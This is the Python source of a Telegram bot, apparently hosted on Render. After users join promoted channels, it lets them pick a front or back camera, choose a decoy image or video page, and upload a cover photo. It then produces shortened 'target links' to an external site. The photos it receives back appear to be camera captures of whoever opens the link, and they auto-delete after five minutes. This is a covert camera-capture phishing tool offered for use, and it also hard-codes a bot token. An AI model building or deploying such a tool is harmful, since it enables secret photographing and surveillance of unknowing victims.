# ==============================================================================
# Elite Controller System - 24/7 Cloud Telegram Bot
# ==============================================================================
import os
import time
import threading
import requests
from flask import Flask
import telebot
from telebot import types

# Background Flask server for Render 24/7 web service port binding
app = Flask(__name__)

@app.route('/')
def home():
    return "✅ Elite Controller 24/7 Cloud Service is Active!"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

threading.Thread(target=run_flask, daemon=True).start()

# Configuration
BOT_TOKEN = os.environ.get("BOT_TOKEN", "9057540528:AAHA3zbRfTvOdYA23ESw43QziYP_qA0_Xqw")
WEBSITE_URL = "https://elitevishal.github.io/Box"

CHANNELS = [
    {"name": "Elite Vishal", "url": "https://t.me/elitevishal", "chat_id": "@elitevishal"},
    {"name": "Elite VIP Channel", "url": "https://t.me/+dmaFFBHLSj9jZTQ9", "chat_id": None},
    {"name": "Elite Bro", "url": "https://t.me/elitebroooo", "chat_id": "@elitebroooo"},
    {"name": "Elite Team Backup", "url": "https://t.me/eliteteambackup", "chat_id": "@eliteteambackup"}
]

bot = telebot.TeleBot(BOT_TOKEN)
user_states = {}

# 5-minute auto-delete helper thread
def auto_delete_photo(chat_id, message_id, delay=300):
    def delete_job():
        time.sleep(delay)
        try:
            bot.delete_message(chat_id=chat_id, message_id=message_id)
            print(f"[Auto-Deleted] Message {message_id} from {chat_id}")
        except Exception as e:
            print(f"[Delete Failed]: {e}")
    threading.Thread(target=delete_job, daemon=True).start()

# Image upload helper (tmpfiles + uguu fallback)
def upload_image(downloaded_bytes):
    try:
        r = requests.post(
            "https://tmpfiles.org/api/v1/upload",
            files={"file": ("photo.jpg", downloaded_bytes, "image/jpeg")},
            timeout=15
        )
        if r.status_code == 200:
            res_json = r.json()
            if res_json.get("status") == "success":
                raw_url = res_json["data"]["url"]
                return raw_url.replace("tmpfiles.org/", "tmpfiles.org/dl/")
    except Exception:
        pass

    try:
        r = requests.post(
            "https://uguu.se/api.php?d=upload-api",
            files={"files[]": ("photo.jpg", downloaded_bytes, "image/jpeg")},
            timeout=15
        )
        if r.status_code == 200 and r.text.startswith("http"):
            return r.text.strip()
    except Exception:
        pass

    return "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600"

# TinyURL shortener helper
def shorten_url(long_url):
    try:
        r = requests.get(f"https://tinyurl.com/api-create.php?url={long_url}", timeout=10)
        if r.status_code == 200 and r.text.startswith("http"):
            return r.text.strip()
    except Exception:
        pass
    return long_url

# /start command
@bot.message_handler(commands=['start', 'link'])
def start_cmd(message):
    chat_id = message.chat.id
    user_name = message.from_user.first_name or "Dost"

    markup = types.InlineKeyboardMarkup(row_width=1)
    for i, ch in enumerate(CHANNELS, start=1):
        markup.add(types.InlineKeyboardButton(f"📢 Join Channel {i}: {ch['name']}", url=ch['url']))
    markup.add(types.InlineKeyboardButton("✅ Confirm & Verify Join", callback_data="verify_join"))

    bot.send_message(
        chat_id,
        f"👋 **Namaste {user_name}!**\n\n"
        f"Bot ka istemal karne ke liye pehle niche diye gaye **4 Channels** ko join karein:\n\n"
        f"Sabhi join karne ke baad **Confirm & Verify Join** par tap karein.",
        reply_markup=markup,
        parse_mode="Markdown"
    )

# Verification callback
@bot.callback_query_handler(func=lambda call: call.data == "verify_join")
def verify_callback(call):
    chat_id = call.message.chat.id
    user_id = call.from_user.id

    all_joined = True
    for ch in CHANNELS:
        if ch["chat_id"]:
            try:
                member = bot.get_chat_member(ch["chat_id"], user_id)
                if member.status not in ['member', 'administrator', 'creator']:
                    all_joined = False
                    break
            except Exception:
                pass

    if all_joined:
        try:
            bot.delete_message(chat_id, call.message.message_id)
        except Exception:
            pass

        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("⚡ Generate Target Link", callback_data="generate_link_click"))

        bot.send_message(
            chat_id,
            "🎉 **Verification Successful!**\n\n"
            "Ab custom link create karne ke liye niche **Generate Target Link** button dabayein:",
            reply_markup=markup,
            parse_mode="Markdown"
        )
    else:
        bot.answer_callback_query(call.id, "❌ Aapne abhi tak sabhi channels join nahi kiye! Pehle join karein.", show_alert=True)

# Step 1: Camera Selection
@bot.callback_query_handler(func=lambda call: call.data == "generate_link_click")
def select_camera_step(call):
    chat_id = call.message.chat.id

    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🤳 Front Camera", callback_data="cam_front"),
        types.InlineKeyboardButton("📸 Back Camera", callback_data="cam_back")
    )

    bot.send_message(
        chat_id,
        "🎯 **Step 1: Camera Mode Select Karein**\n\n"
        "Target link open karne par kaunsa camera activate hona chahiye?",
        reply_markup=markup,
        parse_mode="Markdown"
    )

# Step 2: Theme Selection
@bot.callback_query_handler(func=lambda call: call.data in ["cam_front", "cam_back"])
def camera_chosen(call):
    chat_id = call.message.chat.id
    selected_mode = "front" if call.data == "cam_front" else "back"

    user_states[chat_id] = {
        "cam": selected_mode
    }

    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🖼️ HD Image View", callback_data="theme_photo"),
        types.InlineKeyboardButton("🎬 Video Player View", callback_data="theme_video")
    )

    bot.send_message(
        chat_id,
        "🎨 **Step 2: Cover Theme Select Karein**\n\n"
        "Link open hone par target ko konsa page layout dikhna chahiye?",
        reply_markup=markup,
        parse_mode="Markdown"
    )

# Step 3: Photo Upload Prompt
@bot.callback_query_handler(func=lambda call: call.data in ["theme_photo", "theme_video"])
def theme_chosen(call):
    chat_id = call.message.chat.id
    selected_theme = "photo" if call.data == "theme_photo" else "video"

    if chat_id not in user_states:
        user_states[chat_id] = {"cam": "front"}

    user_states[chat_id]["theme"] = selected_theme
    user_states[chat_id]["step"] = "awaiting_photo"

    cam_name = "Front Camera (🤳)" if user_states[chat_id]["cam"] == "front" else "Back Camera (📸)"
    theme_name = "HD Image View" if selected_theme == "photo" else "Video Player View"

    bot.send_message(
        chat_id,
        f"✅ **Configuration Set!**\n"
        f"• **Camera:** {cam_name}\n"
        f"• **Theme:** {theme_name}\n\n"
        f"🖼️ Ab gallery se ek photo bhejein jo link open karne par preview me dikhegi.",
        parse_mode="Markdown"
    )

# Handle Custom Photo -> Output Short Link
@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    chat_id = message.chat.id
    state = user_states.get(chat_id)

    if state and state.get("step") == "awaiting_photo":
        selected_cam = state.get("cam", "front")
        selected_theme = state.get("theme", "photo")

        loading = bot.send_message(chat_id, "⏳ Photo upload ho rahi hai aur optimized link generate ho raha hai...")

        try:
            file_info = bot.get_file(message.photo[-1].file_id)
            downloaded = bot.download_file(file_info.file_path)

            img_url = upload_image(downloaded)

            base_link = f"{WEBSITE_URL}/?id={chat_id}&cam={selected_cam}&theme={selected_theme}&img={img_url}"
            short_link = shorten_url(base_link)

            user_states[chat_id] = None
            bot.delete_message(chat_id, loading.message_id)

            cam_text = "🤳 Front Camera" if selected_cam == "front" else "📸 Back Camera"
            theme_text = "🖼️ HD Image" if selected_theme == "photo" else "🎬 Video Player"

            bot.send_message(
                chat_id,
                f"✅ **Aapka Link Ready Hai!**\n\n"
                f"🔗 **Short Link:** `{short_link}`\n\n"
                f"📌 **Full Link:** `{base_link}`\n\n"
                f"⚙️ **Config:** {cam_text} | {theme_text}\n"
                f"⏱️ Aayi hui photos **5 minute baad auto-delete** ho jayengi!",
                parse_mode="Markdown"
            )
        except Exception as err:
            bot.send_message(chat_id, f"❌ Error: {err}")
    else:
        # Received photo capture from client
        auto_delete_photo(chat_id, message.message_id, delay=300)

@bot.message_handler(func=lambda msg: True)
def default_msg(message):
    bot.reply_to(message, "Naya link banane ke liye /start bhejें.")

if __name__ == "__main__":
    print("🚀 Telegram Bot 24/7 Cloud Polling started...")
    bot.infinity_polling()
